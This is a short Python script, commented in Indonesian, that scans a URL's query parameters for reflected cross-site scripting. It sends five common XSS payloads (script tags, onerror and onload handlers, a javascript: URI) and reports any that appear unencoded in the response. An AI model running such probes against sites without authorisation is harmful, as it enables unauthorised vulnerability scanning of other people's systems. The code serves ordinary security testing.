import requests

# Payload XSS umum
PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
]

def test_xss(url, params):
    """Test parameter URL untuk XSS."""
    results = []

    for param in params:
        for payload in PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            try:
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                body = response.text

                # Cek apakah payload muncul di response tanpa di-encode
                if payload in body:
                    results.append({
                        "type": "XSS (Reflected)",
                        "severity": "HIGH",
                        "param": param,
                        "payload": payload,
                        "detail": "Payload muncul di response tanpa sanitasi"
                    })
                    break
            except requests.RequestException:
                pass

    return results
